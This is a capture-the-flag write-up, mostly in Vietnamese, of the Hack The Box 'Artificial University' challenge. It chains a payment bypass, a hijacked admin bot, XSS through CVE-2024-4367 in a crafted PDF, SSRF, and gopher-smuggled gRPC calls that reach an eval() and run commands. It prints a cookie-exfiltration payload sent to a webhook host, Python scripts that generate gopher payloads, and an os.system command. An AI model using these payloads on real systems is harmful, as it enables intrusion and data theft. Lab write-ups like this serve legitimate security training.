---
title: "Artificial University"
slug: "htb-artificial-university"
platform: "Hack The Box"
difficulty: "Medium"
vulnerabilities: ["Cross-Site Scripting","Server-Side Request Forgery","Remote Code Execution"]
publishedAt: "2026-09-14"
summary: "Theo dõi quá trình phân tích luồng thanh toán, bot duyệt hóa đơn và các dịch vụ nội bộ."
draft: false
sortOrder: 12
---
## Overview
the application is an e-commerse system with user-facing and admin functions
some main route we should noticed:
- **/checkout** 
    Allow user to creater orders 
- **/checkout/success** 
    Complete the order payment and triggers an admin bot to review the generated invoice PDF
- **/admin/api-health**
    perform a server -side request to user-provided URL
- **/admin/product-stream**
    streams newly generated products by interacting with an interal gRPC service
## Control bot
Reviewing carefully source code we have 
route **/checkout/success** 
![Screenshot 2026-04-10 135004](https://hackmd.io/_uploads/HJuZfmI2bl.png)
**bot.py**
![Screenshot 2026-04-10 141051](https://hackmd.io/_uploads/By4hNXI3We.png)
Từ hai đoạn code có thể thấy khi hoàn thành một order thì sẽ có thể khiến bot tự động truy cập một pdf là hóa đơn của payment và payment_id được truyền vào bot là lấy từ request của route **/checkout/success** 
=>>> payment_id được truyền thẳng vào và k qua ktra một bước nào cả nên ta có thể nghĩ đến việc complete một order với payment_id tùy ý để chỉnh được path
![image](https://hackmd.io/_uploads/rJhxy4LnWe.png)
![image](https://hackmd.io/_uploads/B1PoAm82-e.png)
Ở route **/checkout** nếu k có product_id thì bắt buộc phải có price,title,user_id,email mà 4 tham số đều do người dùng có thể đưa vào.
**payment.py**
```python=
def get_amount_paid(payment_id):
    # Dummy implementation to get payment status
    return 0
```

```python=
amt_paid = get_amount_paid(payment_id)

if amt_paid >= order.price:
    db_session.mark_order_complete(order_id)
```

vì 2 amt_paid luôn là 0 nên nếu price <0 thì sẽ success
=>>> ta có thể tạo một price đơn với price = -1 < 0 để có thể hoàn thành được đơn và điều khiển payment_id mà bot sẽ visit
![35af8e68-dc14-459d-9a15-b5c6544f4618](https://hackmd.io/_uploads/rJUB0E8nZe.jpg)
![image](https://hackmd.io/_uploads/ryv2RE83Zx.png)
ta có thể thấy được đơn hàng đã tạo được thành công. quay lại việc điều khiển path với payment_id ở route **/checkout/success** ta thấy bot sẽ visit với tài khoản admin nên một suuy nghĩ rất đơn giản hiện lên là nhờ con bot truy cập và những route **/admin**
các route như **/admin /admin/users, /admin/orders, /admin/products** chỉ để xem dashboard, dữ liệu.. nên k có gì có thể khai thác thêm. **/admin/api-health , /admin/product-stream** đều những route rất quan trọng tôi sẽ nói ở phía sau. Cuối cùng, ta sẽ đi tiếp khai thác vào route **/admin/view-pdf**
![image](https://hackmd.io/_uploads/BkWStw83be.png)
đoạn code sau kiểm tra quyền login mà bot đã login tài khoản admin rồi nên sẽ qua được và lấy url từ request => kiểm tra có phải pdf k => send file về dạng file-like object
![image](https://hackmd.io/_uploads/SkcPoSUhbl.png)
sử dụng payload sau
![image](https://hackmd.io/_uploads/B1qFiS82Ze.png)
có một request đến webhook và user-agent là python (**requests.get(pdf_url)**) chứng tỏ chính là app fetch url
![image](https://hackmd.io/_uploads/HJKesPL2bx.png)

nhìn log ta có thể thấy app thực sự đã request đến **/admin/view-pdf** trả về 400 do app không thấy có nội dung pdf ở link webhook

## CVE-2024-4367: XSS => SSRF
Như đã nói ở trên route **/admin/view-pdf** nó fetch file xong trả lại đúng PDF inline browse render ==>>> mình có thể kiểm soát file pdf một file không an toàn đưa vào.
![image](https://hackmd.io/_uploads/SkONku8h-x.png)
kết hợp với việc xem phiên bản browse là Firefox 125.0.1 firefox dùng pdf.js để render pdf => có hể có lỗ hổng **XSS** nếu k xử lí đúng
=> từ phiên bản firefox và tìm các vuln liên quan đến pdf-rendering ta tìm được một cve nổi bật **CVE-2024-4367** ảnh hưởng firefox < 126

giải thích qua về CVE này như sau:
    PDF.js có code path dùng newFunction(...) để compile glyph và các lệnh render được ghép thẳng vào chuỗi js.
và có một cơ chế bị lỗi khiến trường FontMatrix bị chèn dữ liệu và -> injection  từ đó js được thực thi và thành **XSS**

=>>> flow tiếp theo sẽ chuyển đoạn **/admin/view-pdf** từ không chỉ  visit webhook mà visit một sever public do mình host có chứa một pdf nguy hiểm chứa đoạn script tùy ý và khiến app chạy đoạn script đó.

Đầu tiên, ai cũng nghĩ đến chạy js lấy cái document.coockie khi **XSS** được vì lấy được cookie admin và có thể dùng gửi request đến các endpoint admin khác. 
payload js sẽ được gắn vào PoC CVE-2024-4367: https://github.com/LOURC0D3/CVE-2024-4367-PoC
sau đó host một public server bằng ngrok: 
![image](https://hackmd.io/_uploads/SJHsjcL2-e.png)
file ta sẽ dùng là poc.pdf
với payload thử lấy cookie như sau:
**new Image().src = 'https://webhook.site/4eee9cc3-f66b-42a7-b6a6-8307b9c805f3/?d=' + document.cookie;**

Sau đó làm lại flow như trên:
=> tạo order với price âm => dùng route /checkout/success => /admin/view-pdf với link https://unregained-nonexternally-gilbert.ngrok-free.dev/CVE-2024-4367-PoC/poc ( vì nó khác tự thêm .pdf cho mình)
![image](https://hackmd.io/_uploads/BJolbsI2Zg.png)
ta có thể thấy log như sau => app đã dùng route **/admin/view-pdf** như ta đã làm trước đó
![image](https://hackmd.io/_uploads/rkIDWiU2Zl.png)
có thể thấy agent đã là firefox =>>> chắc chắn là js đã chạy tuy nhiên k thể lấy cookie.
![image](https://hackmd.io/_uploads/SkrvbcLhbl.png)
ta thấy httponly tuy k phải cookie của bot bên kia nhiên cũng phần nào thấy được rằng k thể lấy cookie kiểu cross-site 

ta thấy các route **/admin** khác đều cần session mà runtime của browser lại có session rồi. Liệu k bắt nó gọi ra ngoài mà gọi các route **/admin** trong cùng app có thể sẽ gửi cùng cookie kèm được k ta thử đổi payload thành: "location = 'http://127.0.0.1:1337/admin';" 
và đã xác nhận **SSRF**
![image](https://hackmd.io/_uploads/rynLZ2L2-x.png)

## gRPC serviec to RCE

sau khi đã có **SSRF** ta nhìn qua các route admin của app thì thấy một route vô cùng thú vị là **/admin/product-stream**
![image](https://hackmd.io/_uploads/SJJsSRw3-g.png)

app không tự xử lý logic mà tạo **ProductClient()**
![image](https://hackmd.io/_uploads/BkpLvAv2-e.png)
gọi service ở 127.0.0.1:50051 qua gRPC(nói qua về gRPC đây là một protocol gọi func từ xa và chạy trên HTTP/2 + protobuf binary)

=>>> có backend nội bộ và route admin chỉ là frontend cho service này

ta sẽ nghiên cứu thêm về các method mà nó có trước khi quay lại và trong **product.proto** có liệt kê 4 cái
![image](https://hackmd.io/_uploads/S1E2OCwn-e.png)
nhìn qua thì thấy ngay cái debugService khả nghi nên ta đọc thêm file api.py ta có 
![image](https://hackmd.io/_uploads/H13JK0vnZe.png)
request.input tức là lấy input từ app gửi lên mà không kiểm tra gì xong biến toàn bộ thành key-value dict Python
tiếp đến hàm **UpdateService**
![image](https://hackmd.io/_uploads/ry4E5AP2Ze.png)
hàm này có tác dụng cập nhât/ ghi đè dữ liệu từ source sang destination và có đệ quy
và cuối là **GenerateProduct**
![image](https://hackmd.io/_uploads/Bkrt50wnbg.png)
dùng để tạo product và nếu có atribute price_formula thì dùng eval() để tính giá và hàm này thì cực kì nguy hiểm vì nó lấy chuỗi string và thực thi như code Py và **nếu mình có thể nhét biểu thức  mình muốn thì có thể dẫn đến RCE**

Nhưng trước khi đi sâu hơn cần giải thích thật kĩ lại flow tại sao **/admin/product-stram** nó liên quan đến đây 

browser get **/admin/product-stream** -> app -> **productclient()** -> **client.get_new_product()** -> 
**stub.GetNewProduct(Empty())**-> **request tới 127.0.0.1:50051**-> **/product.ProductService/GetNewProducts** -> **ProductService.GetNewProducts()**

còn **DebugSerVice** là một method gRPC khác mình sẽ chuẩn bị nó trước tự gọi và từ đó dùng /admin/product-stream có flow đến **GetNewProduct** để chạy hàm **eval()**

nhìn lại đoạn **/admin/api-health**
![image](https://hackmd.io/_uploads/HJPmxkunZl.png)
route này cho phép nhận url 
![image](https://hackmd.io/_uploads/HySVg1O3Wx.png)
và dùng curl gọi mình muốn lợi dụng route này để gọi **DebugService**. mà Server đích là gRPC k phải route Http nên ta cần một cách oách hơn để đẩy data đến server nội bộ này =>>>> gopher 

từ đây ta suy ra được flow tạo một link gopher mà từ đó request có thể chạm vào DebugService => ghi vào price_formula thành cái mình muốn nó eval() vào state của ProductService từ đó gọi cái **/admin/product-stream** => gọi đến GetNewProducts() như mình muốn rồi mới eval( cái payload mình muốn gửi)

ta tạo link gopher ví dụ 
```python=
#!/usr/bin/env python3
import sys
import struct
from urllib.parse import quote_from_bytes

from h2.connection import H2Connection
from h2.config import H2Configuration

sys.path.append("./src/product_api")

import product_pb2

# cái này tạo protobuf request
req = product_pb2.MergeRequest()
req.input["price_formula"].string_value = "1+1"
# biến nó thành byte chứ k gửi bằng cái này làm gì-)
pb = req.SerializeToString()

# bọc cái pb này lại theo format gRPC
grpc_msg = b"\x00" + struct.pack(">I", len(pb)) + pb

#  tạo cái http/2 frames
conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
conn.initiate_connection()

headers = [
    (":method", "POST"),
    (":scheme", "http"),
    (":path", "/product.ProductService/DebugService"),
    (":authority", "127.0.0.1:50051"),
    ("content-type", "application/grpc"),
    ("te", "trailers"),
    ("grpc-timeout", "5S"),
]

conn.send_headers(1, headers)
conn.send_data(1, grpc_msg, end_stream=True)

raw = conn.data_to_send()
#encode để gửi
gopher_url = "gopher://127.0.0.1:50051/_" + quote_from_bytes(raw, safe="")
print(gopher_url)
```
đây là một payload đơn giản thực hiện 1+1 để test và đã có cmt từng đoạn cho dễ hiểu 

thực hiện các bước như đã nói flow ở trên submit gopher url cho nó vào debugser=> sang xem kết quả ở /admin/product-stream
![image](https://hackmd.io/_uploads/Hk3_Lku3bx.png)
đoạn này chứng tỏ  đã gửi thành công gRPC request đến method **DebugService** và đặc biệt còn truyền đúng field mình cần là **price_formula = 1+1**
Và trời không phụ lòng người =>
![image](https://hackmd.io/_uploads/HJeywyd2Zg.png)
ra price 2 tức mình đã chạm được việc thực thi ở hàm eval()
=>> cũng được gọi là RCE thành công rồi

## Final Exploitation
sau đây ta chốt lại chain để làm bài này:
1. tạo một external order với giá âm để bypass thanh toán
2. dùng cái payment_id ở **/checkout/success** để control con bot vào route nội bộ
3. dùng cái route nội bộ lái được là /admin/view-pdf mở pdf độc mình host
4. ăn xss dùng một form js để ssrf đến /admin/api-health 
5. từ ssrf và /admin/api-health send một gopher vào gRPC nội bộ
6. gọi DebugService để set payload trong price_formula
7. Kích payload bằng cách truy cập /admin/product-stream 
8. đọc flag

![image](https://hackmd.io/_uploads/BkYbi1_hbl.png)
![image](https://hackmd.io/_uploads/BkLfjJdhbl.png)
tạo được đơn với giá trị âm
tạo link gopher 
```python=
import sys
from h2.connection import H2Connection
from h2.config import H2Configuration

sys.path.append("./src/product_api")
import product_pb2

cmd = "__import__('os').system('cp /flag* /app/store/application/static/flag.txt')"

req = product_pb2.MergeRequest()
req.input["price_formula"].string_value = cmd

msg = req.SerializeToString()
grpc_body = b"\x00" + len(msg).to_bytes(4, "big") + msg

config = H2Configuration(client_side=True, header_encoding="utf-8")
conn = H2Connection(config=config)

conn.initiate_connection()
out = conn.data_to_send()

headers = [
    (":method", "POST"),
    (":scheme", "http"),
    (":path", "/product.ProductService/DebugService"),
    (":authority", "127.0.0.1:50051"),
    ("content-type", "application/grpc"),
    ("te", "trailers"),
    ("grpc-timeout", "1S"),
]

conn.send_headers(1, headers)
out += conn.data_to_send()

conn.send_data(1, grpc_body, end_stream=True)
out += conn.data_to_send()

gopher = "gopher://127.0.0.1:50051/_" + "".join("%%%02x" % b for b in out)
print(gopher)
```
code này thì hoàn chỉnh hơn nhưng form cũng tựa tựa code mình đã giải thích ở trên với payload :
__import__('os').system('cp /flag* /app/store/application/static/flag.txt 
dùng để copy flag ra /static/flag.txt  để đọc được

sau đó tạo pdf độc với payload sau:
"var f = document.createElement\('form'\);f.action = 'http://127.0.0.1:1337/admin/api-health';f.method = 'POST';var i = document.createElement\('input'\);i.name = 'url';i.value = 'gopher://127.0.0.1:50051/.....;f.appendChild\(i\);document.body.appendChild\(f\);f.submit\(\)""



link gopher dài quá k viết  đủ dc và mình sẽ host pdf này bằng ngrok
![image](https://hackmd.io/_uploads/SJ2po1u3Wl.png)
tiếp đến là dùng **/checkout/success** để bắt app view đến pdf của mình

![image](https://hackmd.io/_uploads/SyfN61_2Zg.png)

lúc này sẽ có ssrf đến api-health và post link gopher và chỉnh state qua DebugService và mình sẽ kích nổ bằng /admin/product-stream nhưng đây k phải local nên mình dùng payment_id tiếp như lúc view-pdf
![image](https://hackmd.io/_uploads/B1R3ak_2bl.png)
cuối cùng là đọc flag thôi
![image](https://hackmd.io/_uploads/SywRT1dhWx.png)

chưa bao giờ viết wu dài thế này. Cảm ơn anh chị và các bạn đã đọc đến đây <3 <3